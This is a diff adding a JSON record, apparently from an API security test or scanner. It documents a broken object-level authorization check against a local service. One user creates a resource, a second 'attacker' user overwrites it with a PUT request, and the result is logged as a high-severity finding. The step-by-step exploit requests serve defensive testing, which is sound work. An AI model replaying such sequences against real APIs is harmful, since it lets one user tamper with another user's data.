@@ -1,0 +1,95 @@
+{
+  "name": "bola-update-check",
+  "steps": [
+    {
+      "id": "login_owner",
+      "status_code": 200,
+      "request": {
+        "url": "http://127.0.0.1:9001/login",
+        "method": "POST",
+        "body": {
+          "username": "owner",
+          "password": "Password123"
+        },
+        "headers": {}
+      },
+      "response": {
+        "token": "token_owner"
+      },
+      "ok": true
+    },
+    {
+      "id": "create_resource",
+      "status_code": 200,
+      "request": {
+        "url": "http://127.0.0.1:9001/resources",
+        "method": "POST",
+        "body": {
+          "name": "owner-only-resource",
+          "data": "secret"
+        },
+        "headers": {
+          "Authorization": "Bearer token_owner"
+        }
+      },
+      "response": {
+        "id": "8af655d1-8d54-4b7f-a976-39881acea468",
+        "owner_id": 101,
+        "name": "owner-only-resource",
+        "data": "secret"
+      },
+      "ok": true
+    },
+    {
+      "id": "login_attacker",
+      "status_code": 200,
+      "request": {
+        "url": "http://127.0.0.1:9001/login",
+        "method": "POST",
+        "body": {
+          "username": "attacker",
+          "password": "Password123"
+        },
+        "headers": {}
+      },
+      "response": {
+        "token": "token_attacker"
+      },
+      "ok": true
+    },
+    {
+      "id": "attacker_updates_owner_resource",
+      "status_code": 200,
+      "request": {
+        "url": "http://127.0.0.1:9001/resources/8af655d1-8d54-4b7f-a976-39881acea468",
+        "method": "PUT",
+        "body": {
+          "name": "owner-only-resource",
+          "data": "changed-by-attacker"
+        },
+        "headers": {
+          "Authorization": "Bearer token_attacker"
+        }
+      },
+      "response": {
+        "message": "Resource updated successfully"
+      },
+      "ok": true
+    }
+  ],
+  "context": {
+    "token_owner": "token_owner",
+    "resource_id": "8af655d1-8d54-4b7f-a976-39881acea468",
+    "token_attacker": "token_attacker"
+  },
+  "findings": [
+    {
+      "type": "BOLA",
+      "severity": "high",
+      "evidence": {
+        "create": "create_resource",
+        "attack_update": "attacker_updates_owner_resource"
+      }
+    }
+  ]
+}
